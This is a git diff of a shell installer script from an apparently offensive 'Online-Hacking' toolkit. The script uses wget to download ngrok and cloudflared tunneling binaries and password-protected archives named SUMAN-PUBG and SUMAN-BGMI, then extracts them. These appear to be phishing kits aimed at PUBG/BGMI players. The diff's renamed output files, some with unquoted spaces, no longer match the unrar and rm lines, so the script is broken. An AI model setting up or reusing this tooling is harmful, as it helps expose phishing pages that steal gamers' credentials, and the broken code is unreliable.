@@ -112,8 +112,8 @@ echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   --------------------
 echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         Download Link Services         !!\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
-wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok -O ngrok
-wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
+wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok -O Ngrok
+wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O CloudFlared
 echo""
 clear
 echo ""
@@ -122,8 +122,8 @@ echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   --------------------
 echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
-wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SM/newsite/SUMAN-PUBG.rar -O SUMAN-PUBG.rar
-wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SM/newsite/SUMAN-BGMI.rar -O SUMAN-BGMI.rar
+wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SM/newsite/SUMAN-PUBG.rar -O SUMAN PUBG Server
+wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SM/newsite/SUMAN-BGMI.rar -O SUMAN BGMI Server
 unrar x -Password SUMAN-PUBG.rar
 unrar x -Password SUMAN-BGMI.rar
 rm -rf SUMAN-PUBG.rar SUMAN-BGMI.rar
